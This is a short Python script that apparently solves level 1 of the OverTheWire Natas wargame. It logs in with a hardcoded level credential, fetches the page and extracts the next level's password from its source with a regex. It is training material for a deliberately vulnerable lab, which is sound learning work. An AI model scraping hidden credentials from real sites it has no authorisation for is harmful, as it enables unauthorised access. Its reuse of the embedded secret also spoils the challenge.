import re
import requests


def main():
    URL = "http://natas1.natas.labs.overthewire.org"
    s = requests.Session()
    s.auth = ("natas1", "g9D9cREhslqBKtcA2uocGHPfMZVzeFK6")
    r = s.get(URL)
    natas1_password = re.findall(r"([a-zA-Z\d]{32})", r.text) 
    print("[!] The password for Natas 2 is: " + natas1_password[1])


if __name__ == '__main__':
    main()
